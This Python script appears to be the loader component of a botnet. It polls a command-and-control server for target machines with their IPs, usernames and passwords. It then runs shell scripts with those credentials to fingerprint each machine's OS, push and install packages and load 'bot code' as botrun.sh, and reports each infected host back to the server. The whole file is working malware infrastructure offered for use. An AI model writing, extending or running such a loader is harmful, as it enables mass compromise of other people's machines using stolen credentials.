import subprocess
import requests 
import pprint
import os
import time
import logging 
import string 
import random
  
#Create and configure logger 
logging.basicConfig(filename="logs/loader.log", 
                    format='%(asctime)s %(message)s', 
                    filemode='w') 
  
#Creating an object 
logger=logging.getLogger() 
  
#Setting the threshold of logger to DEBUG
ip = "127.0.0.1"
port = "5000" 
logger.setLevel(logging.DEBUG) 
with open(".config","r") as f:
    for line in f:
        k,v=line.strip().split("=")
        k = k.strip()
        v = v.strip()
        if(k=="cnc"):
            ip = v
        elif(k=="port"):
            port = v

cnc = "http://"+ip+":"+port

def randomFileName(stringLength=10):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return "botrun.sh"
    # return (''.join(random.choice(letters) for i in range(stringLength)))+".sh"

def execute(cmd):
    popen = subprocess.Popen(cmd, stdout=subprocess.PIPE, universal_newlines=True)
    for stdout_line in iter(popen.stdout.readline, ""):
        yield stdout_line 
    popen.stdout.close()
    return_code = popen.wait()
    if return_code:
        raise subprocess.CalledProcessError(return_code, cmd)

path = "loader/install/"
def load(system):
    logger.info(system["ip"])
    out = subprocess.Popen(['sh', path+'getOS.sh', system["username"],system["password"],system["ip"]], 
           stdout=subprocess.PIPE, 
           stderr=subprocess.STDOUT)
    out.wait()
    stdout,stderr=out.communicate()
    logger.error(stderr)
    output = stdout.decode('utf-8').replace('"','').split('\n')
    details ={}
    for o in output:
        if(o.find("=")!=-1):
            key,value = o.split("=")
            details[key]=value
    # logger.info(output)
    # pprint.plogger.info(details)
    #logger.info(details["UNAME"])
    details["UNAME"]=details["UNAME"].split(" ")[2]
    #logger.info(details["UNAME"])
    if("NAME" not in details.keys()):
        details["NAME"] = "Linux"
    if("ID" not in details.keys()):
        details["ID"] = "linux"
    if("VERSION_CODENAME" not in details.keys()):
        details["VERSION_CODENAME"]=""
    if("VERSION_ID" not in details.keys()):
        details["VERSION_ID"]=""
    if("ARCHITECTURE" not in details.keys()):
        details["ARCHITECTURE"]=""
    directoryName = details["ARCHITECTURE"]+"_"+details["UNAME"]+"_"+details["NAME"]+"_"+details["ID"]+"_"+details["VERSION_CODENAME"]+"_"+details["VERSION_ID"]
    directoryName=directoryName.replace(" ", "")
    directoryName=directoryName.replace("/", "")
    logger.info("Directory Name: "+directoryName)
    if(directoryName not in os.listdir(path+"debs")):
        logger.info("Downloading Packages...getDebs.sh")
        for line in execute(['sh', path+'getDebs.sh', system["username"],system["password"],system["ip"],directoryName]):
            logger.info("IN getDebs.sh\t"+line.strip())
    else:
        logger.info("Pushing Packages...moveDebs.sh")
        for line in execute(['sh', path+'moveDebs.sh', system["username"],system["password"],system["ip"],directoryName]):
            logger.info("IN moveDebs.sh\t"+line.strip())

    logger.info("Installing Packages...install.sh")
    for line in execute(['sh', path+'install.sh', system["username"],system["password"],system["ip"]]):
        logger.info("IN install.sh\t"+line.strip())
        
    
    logger.info("loading bot code...load.sh")
    for line in execute(['sh', path+'load.sh', system["username"],system["password"],system["ip"],randomFileName(10)]):
        logger.info("IN load.sh\t"+line.strip())

    return os.path.abspath("debs/"+directoryName)


while(1):
    time.sleep(10)
    logger.info("querying DB...")
    systems = list(requests.get(url = cnc+"/getbotunset").json().values())
    for system in systems:
        # logger.info(system)
        directoryName = load(system)
        requests.get(url=cnc+"/setloaded/"+system["ip"])
        requests.post(url=cnc+"/storeDirectory/"+system["ip"],json={"directoryName":directoryName})
        logger.info("Loaded "+system["ip"])

